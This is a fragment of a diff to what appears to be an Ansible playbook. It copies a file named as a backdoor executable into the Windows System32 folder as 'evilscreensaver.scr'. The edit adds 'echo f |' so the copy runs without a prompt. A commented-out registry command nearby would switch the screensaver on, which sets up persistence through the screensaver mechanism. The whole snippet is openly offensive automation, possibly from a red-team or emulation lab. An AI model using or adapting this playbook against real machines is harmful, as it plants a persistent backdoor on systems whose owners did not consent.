@@ -7,7 +7,7 @@
         - name:
           tags: always
           win_command: |
-            xcopy "{{ backdoor_exe }}"  c:\Windows\System32\evilscreensaver.scr
+            echo f | xcopy "{{ backdoor_exe }}"  c:\Windows\System32\evilscreensaver.scr
         - name: Activate Screen saver
           #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
           tags: always
